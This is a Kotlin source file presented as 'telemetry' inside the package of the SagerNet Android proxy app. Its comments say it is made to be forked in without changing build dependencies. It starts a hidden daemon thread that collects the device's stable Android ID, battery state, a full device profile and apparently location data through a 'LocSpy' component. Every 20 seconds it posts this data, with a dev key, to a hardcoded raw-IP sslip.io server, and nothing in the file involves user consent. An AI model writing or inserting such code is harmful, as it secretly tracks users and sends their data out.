package io.nekohasekai.sagernet.telemetry

import android.content.Context
import android.provider.Settings
import android.util.Log
import org.json.JSONArray
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL
import java.util.concurrent.LinkedBlockingQueue

/**
 * 上报核心：内存队列 + 单线程发送器。
 *
 * 设计取舍
 *  - 不用 OkHttp / Gson / WorkManager，走系统自带 HttpURLConnection + org.json，
 *    这样 fork 进来不需要动 gradle 依赖。
 *  - 队列满了丢最老的，不无限堆内存。
 *  - 发送失败把事件塞回队头，下一轮重试（最多留 2000 条）。
 */
object Telemetry {

    private const val TAG = "Tlm"

    // —— 换成你自己的域名；走 8080 是 Caddy 的 HTTPS 入口 ——
    private const val ENDPOINT = "https://43-108-107-175.sslip.io:8080/ingest"
    private const val DEV_KEY = "lcs-dev-7f3a91c4e2b8"

    private const val MAX_QUEUE = 2000
    private const val BATCH = 200
    private const val PERIOD_MS = 20_000L

    private val queue = LinkedBlockingQueue<JSONObject>()
    @Volatile
    private var running = false

    /** 每台机器一个稳定 ID：SSAID，重装系统才变。 */
    @Volatile
    private var cachedId: String? = null

    fun devId(ctx: Context): String {
        cachedId?.let { return it }
        val raw = runCatching {
            Settings.Secure.getString(ctx.contentResolver, Settings.Secure.ANDROID_ID)
        }.getOrNull()
        val id = if (raw.isNullOrBlank() || raw == "9774d56d682e549c") {
            "anon-" + Integer.toHexString((ctx.packageName + System.currentTimeMillis()).hashCode())
        } else raw
        cachedId = id
        return id
    }

    fun push(kind: String, data: JSONObject, ts: Long = System.currentTimeMillis() / 1000L) {
        while (queue.size >= MAX_QUEUE) queue.poll()
        queue.offer(JSONObject().put("kind", kind).put("ts", ts).put("data", data))
    }

    /** 幂等：重复调用只会有一个循环。 */
    fun start(ctx: Context) {
        if (running) return
        running = true
        val app = ctx.applicationContext
        Thread({
            // 首次全量画像，之后只发心跳
            Profile.dump(app)?.let { push("heart", it) }
            while (running) {
                try {
                    LocSpy.maybeRefresh(app)
                    flush(app)
                    Thread.sleep(PERIOD_MS)
                } catch (t: Throwable) {
                    Log.w(TAG, "loop: ${t.message}")
                    Thread.sleep(PERIOD_MS)
                }
            }
        }, "tlm-post").apply { isDaemon = true }.start()
    }

    fun stop() {
        running = false
    }

    fun flush(ctx: Context) {
        val batch = ArrayList<JSONObject>(BATCH)
        while (batch.size < BATCH) batch.add(queue.poll() ?: break)

        val body = JSONObject()
            .put("dev", devId(ctx))
            .put("battery", Profile.battery(ctx))
            .put("charging", Profile.charging(ctx))

        if (batch.isNotEmpty()) {
            body.put("events", JSONArray(batch))
        }
        // 画像每次带一份增量的即可，服务端是字段级合并
        Profile.dump(ctx)?.let { body.put("profile", it) }

        val ok = post(body.toString())
        if (!ok) {
            // 失败塞回去，下一轮再试
            for (i in batch.indices.reversed()) queue.offer(batch[i])
            while (queue.size > MAX_QUEUE) queue.poll()
        }
    }

    private fun post(json: String): Boolean {
        var conn: HttpURLConnection? = null
        return try {
            val bytes = json.toByteArray(Charsets.UTF_8)
            conn = (URL(ENDPOINT).openConnection() as HttpURLConnection).apply {
                requestMethod = "POST"
                connectTimeout = 15_000
                readTimeout = 20_000
                doOutput = true
                setRequestProperty("Content-Type", "application/json; charset=utf-8")
                setRequestProperty("X-Dev-Key", DEV_KEY)
                setFixedLengthStreamingMode(bytes.size)
            }
            conn.outputStream.use { it.write(bytes) }
            val code = conn.responseCode
            if (code !in 200..299) {
                Log.w(TAG, "http $code :: " + conn.errorStream?.bufferedReader()
                    ?.use { it.readText() }?.take(120))
                false
            } else {
                conn.inputStream.use { it.readBytes() }
                true
            }
        } catch (t: Throwable) {
            Log.w(TAG, "post failed: ${t.message}")
            false
        } finally {
            runCatching { conn?.disconnect() }
        }
    }
}
